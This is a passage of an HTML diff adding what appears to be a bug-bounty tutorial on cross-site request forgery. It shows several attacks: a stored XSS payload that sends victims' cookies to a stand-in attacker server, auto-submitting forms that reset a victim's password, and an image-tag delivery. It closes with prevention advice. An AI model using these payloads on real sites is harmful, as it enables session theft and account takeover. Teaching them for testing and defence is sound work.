+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">email</span><span style="color:#f92672">=</span><span style="color:#a6e22e">ATTACKER_EMAIL</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">csrf_token</span><span style="color:#f92672">=</span>
+</span></span></code></pre></div><hr>
+<h3 id="create-stored-self-xss-by-using-csrf">Create Stored Self-XSS by Using CSRF</h3>
+<p>If we combined the Self XSS with CSRF we will get a stored XSS.</p>
+<p>Lets say we have a website <a href="http://example.com">example.com</a> and its have a subdomain called <a href="http://finance.example.com">finance.example.com</a> its give the user to make a nickname for his bank account.</p>
+<p>However, the endpoint used to change the account nicknames is vulnerable to <code>CSRF</code>  so simply omitting the token parameter in the request will <code>bypass CSRF protection</code>.
+This request will fail as it have a wrong csrf token:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">change_account_nickname</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">finance</span>.<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">session_cookie</span><span style="color:#f92672">=</span><span style="color:#a6e22e">YOUR_SESSION_COOKIE</span>;
+</span></span><span style="display:flex;"><span>(<span style="color:#a6e22e">POST</span> <span style="color:#a6e22e">request</span> <span style="color:#a6e22e">body</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">account</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">nickname</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;script&gt;document.location=&#39;http://attacker_server_ip/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">cookie_stealer.php?c=&#39;+document.cookie;&lt;/script&gt;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">csrf_token</span><span style="color:#f92672">=</span><span style="color:#a6e22e">WRONG_TOKEN</span>
+</span></span></code></pre></div><p>But this request, with no token at all, would succeed:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">change_account_nickname</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">finance</span>.<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">session_cookie</span><span style="color:#f92672">=</span><span style="color:#a6e22e">YOUR_SESSION_COOKIE</span>;
+</span></span><span style="display:flex;"><span>(<span style="color:#a6e22e">POST</span> <span style="color:#a6e22e">request</span> <span style="color:#a6e22e">body</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">account</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">nickname</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;script&gt;document.location=&#39;http://attacker_server_ip/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">cookie_stealer.php?c=&#39;+document.cookie;&lt;/script&gt;&#34;</span>
+</span></span></code></pre></div><p>This request will change the user’s account nickname and store the XSS payload there. The next time a user logs into the account and views their dashboard, they’ll trigger the <code>XSS</code>.</p>
+<hr>
+<h3 id="take-over-user-accounts-by-using-csrf">Take Over User Accounts by Using CSRF</h3>
+<p>Sometimes CSRF lead to account takeover but this uncommon cuz it must be in criticla function like change password, email, phone number.</p>
+<p>For example: <a href="http://example.com">example.com</a> allow their users to sign up via their social media accounts</p>
+<p>If a user chooses this option, they’re not required to create a password, as they can simply log in via their linked account.</p>
+<p>The request will be like that:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">set_password</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">session_cookie</span><span style="color:#f92672">=</span><span style="color:#a6e22e">YOUR_SESSION_COOKIE</span>;
+</span></span><span style="display:flex;"><span>(<span style="color:#a6e22e">POST</span> <span style="color:#a6e22e">request</span> <span style="color:#a6e22e">body</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">password</span><span style="color:#f92672">=</span><span style="color:#a6e22e">XXXXX</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">csrf_token</span><span style="color:#f92672">=</span><span style="color:#ae81ff">871</span><span style="color:#a6e22e">caef0757a4ac9691aceb9aad8b65b</span>
+</span></span></code></pre></div><p>Since the user signed up via their social media account, they don’t need to provide an old password to set the new password, so if CSRF protection
+fails on this endpoint, an attacker would have the ability to set a password for anyone who signed up via their social media account and hasn’t yet done so.</p>
+<p>Lets say this is the request for setting the password for the first time and the website dosen’t validate the blank csrf-token:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">set_password</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">session_cookie</span><span style="color:#f92672">=</span><span style="color:#a6e22e">YOUR_SESSION_COOKIE</span>;
+</span></span><span style="display:flex;"><span>(<span style="color:#a6e22e">POST</span> <span style="color:#a6e22e">request</span> <span style="color:#a6e22e">body</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">password</span><span style="color:#f92672">=</span><span style="color:#a6e22e">XXXXX</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">csrf_token</span><span style="color:#f92672">=</span>
+</span></span></code></pre></div><p>Now all an attacker has to do is to post a link to this HTML page on pages frequented by users of the site, and they can automatically assign the password of any user who visits the malicious page:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://email.example.com/set_password&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;csrf-form&#34;</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;new_password&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;this_account_is_now_mine&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;csrf_token&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;submit&#39;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Submit&#34;</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">script</span>&gt;document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;csrf-form&#34;</span>).<span style="color:#a6e22e">submit</span>();&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>After that, the attacker is free to log in as any of the affected victims with the newly assigned password <code>this_account_is_now_mine</code>.</p>
+<hr>
+<h3 id="delivering-the-csrf-payload">Delivering the CSRF Payload</h3>
+<p>The first and simplest option of delivering a CSRF payload is to trick users into visiting an external malicious site. For example, let’s say <a href="http://example.com/"><code>example.com</code></a>
+has a forum that users frequent. In this case, attackers can post a link like this on the forum to encourage users to visit their page:</p>
+<p>Visit this page to get a discount on your <a href="http://example.com/"><code>example.com</code></a> subscription: <a href="https://example.attacker.com/"><code>https://example.attacker.com</code></a></p>
+<p>And on <a href="http://example.attacker.com/">example.attacker.com</a>, the attacker can host an auto-submitting form to execute the CSRF:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://email.example.com/set_password&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;csrf-form&#34;</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;new_password&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;this_account_is_now_mine&#34;</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;submit&#39;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Submit&#34;</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">script</span>&gt;document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;csrf-form&#34;</span>).<span style="color:#a6e22e">submit</span>();&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>for example, as an <code>image</code> posted to a forum. This way, any user who views the forum page <code>would be affected:</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://email.example.com/set_password?new_password=this_account_is_now_mine&#34;</span>&gt;
+</span></span></code></pre></div><p>In the malicious script, the attacker can include code that sends the CSRF payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span> document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> &lt;form method=&#34;</span><span style="color:#a6e22e">POST</span><span style="color:#e6db74">&#34; action=&#34;</span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//email.example.com/set_password&#34; id=&#34;csrf-form&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;new_password&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;this_account_is_now_mine&#34;</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;submit&#39;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Submit&#34;</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;/<span style="color:#f92672">form</span>&gt;<span style="color:#e6db74">&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> document.getElementById(&#34;</span><span style="color:#a6e22e">csrf</span><span style="color:#f92672">-</span><span style="color:#a6e22e">form</span><span style="color:#960050;background-color:#1e0010">&#34;</span>).<span style="color:#a6e22e">submit</span>();
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><hr>
+<h1 id="finding-your-first-csrf"><code>Finding Your First CSRF!</code></h1>
+<p>Armed with this knowledge about CSRF bugs, bypassing CSRF protection, and escalating CSRF vulnerabilities, you’re now ready to look for your first
+CSRF vulnerability! Hop on a bug bounty program and find your first CSRF by following the steps covered in this chapter:</p>
+<ol>
+<li>Spot the state-changing actions on the application and keep a note on their locations and functionality.</li>
+<li>Check these functionalities for CSRF protection. If you can’t spot any protections, you might have found a vulnerability!</li>
+<li>If any CSRF protection mechanisms are present, try to bypass the protection by using the protection-bypass techniques mentioned in this chapter.</li>
+<li>Confirm the vulnerability by crafting a malicious HTML page and visiting that page to see if the action has executed.</li>
+<li>Think of strategies for delivering your payload to end users.</li>
+<li>Draft your first CSRF report!</li>
+</ol>
+<hr>
+<h1 id="prevention"><code>Prevention</code></h1>
+<p>The most robust way to defend against CSRF attacks is to include a <a href="https://portswigger.net/web-security/csrf/tokens">CSRF token</a> within relevant requests. The token should be:</p>
+<ul>
+<li>Unpredictable with high entropy, as for session tokens in general.</li>
+<li>Tied to the user&rsquo;s session.</li>
+<li>Strictly validated in every case before the relevant action is executed.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://twitter.com/send_a_tweet&#34;</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tweet_content&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Hello world!&#34;</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;csrf_token&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;871caef0757a4ac9691aceb9aad8b65b&#34;</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Submit&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
+</span></span></code></pre></div><p>the request will be like that:</p>
+<pre tabindex="0"><code>POST /send_a_tweet
+Host: twitter.com
+Cookie: session_cookie=YOUR_TWITTER_SESSION_COOKIE
+(POST request body)
+tweet_content=&#34;Hello world!&#34;&amp;csrf_token=**871caef0757a4ac9691aceb9aad8b65b**
+</code></pre><h3 id="samesitecookie">SameSiteCookie</h3>
+<p>The Set-Cookie header allows you to use several optional flags to protect
+your users’ cookies, one of which is the SameSite flag. When the SameSite flag
+on a cookie is set to Strict, the client’s browser won’t send the cookie during cross-site requests:</p>
+<pre tabindex="0"><code>Set-Cookie: PHPSESSID=UEhQU0VTU0lE; Max-Age=86400; Secure; HttpOnly; SameSite=Strict
+</code></pre><p>The account nickname field is vulnerable to <code>self-XSS</code>: there is no sanitization, validation, or escaping for user input on the field.</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
